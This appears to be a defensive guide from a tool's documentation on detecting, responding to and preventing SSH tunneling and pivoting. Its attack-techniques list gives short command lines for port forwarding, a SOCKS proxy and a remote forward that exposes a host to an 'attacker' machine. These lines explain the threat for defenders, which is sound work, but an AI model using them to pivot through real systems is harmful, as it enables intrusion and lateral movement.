# Defense: SSH Tunneling & Pivoting

## Threat

Attackers use SSH tunnels to pivot through compromised hosts, forward ports, create SOCKS proxies, and exfiltrate data through encrypted channels that blend with legitimate traffic.

**MITRE ATT&CK:** T1572 (Protocol Tunneling)

## Attack Techniques

- **Local port forward**: `ssh -L 8080:internal:80 compromised` — access internal service
- **Remote port forward**: `ssh -R 4444:localhost:22 attacker` — expose host to attacker
- **SOCKS proxy**: `ssh -D 1080 compromised` — route all traffic through victim
- **ProxyJump**: `ssh -J compromised internal` — chain through hosts

## Detection

### defense-kit scanners
- `ssh` — detects AllowTcpForwarding, GatewayPorts, PermitTunnel enabled
- `connections` — detects SSH outbound from unexpected processes
- `processes` — detects SSH with forwarding flags

### Manual verification
```bash
# Check for active SSH tunnels
ss -tnp | grep ssh | grep -v ":22"

# Check for SSH processes with port forwarding
ps aux | grep "ssh.*-[LRD]"

# Check sshd config allows tunneling
grep -i "AllowTcpForwarding\|GatewayPorts\|PermitTunnel\|AllowStreamLocalForwarding" /etc/ssh/sshd_config

# Check active SSH sessions
who
w
last | head -20

# Check for autossh (persistent tunnels)
ps aux | grep autossh
```

## Response

1. **Kill tunnels**: identify and kill SSH processes with forwarding
2. **Disable forwarding**: `AllowTcpForwarding no` in sshd_config
3. **Reset credentials**: attacker has valid SSH credentials
4. **Block lateral movement**: firewall between segments
5. **Audit**: check what was accessed through the tunnel

## Prevention

```bash
# Disable SSH tunneling
echo "AllowTcpForwarding no" >> /etc/ssh/sshd_config
echo "GatewayPorts no" >> /etc/ssh/sshd_config
echo "PermitTunnel no" >> /etc/ssh/sshd_config
systemctl restart sshd

# defense-kit harden fixes these automatically
defense-kit harden --mode interactive

# Monitor for tunnel creation
auditctl -a always,exit -F arch=b64 -S connect -F a2=16 -k ssh_tunnel
```

## References
- [ESXi Ransomware SSH Tunneling - Sygnia](https://www.sygnia.co/blog/esxi-ransomware-ssh-tunneling-defense-strategies/)
- [Protocol Tunneling T1572 - MITRE ATT&CK](https://attack.mitre.org/techniques/T1572/)
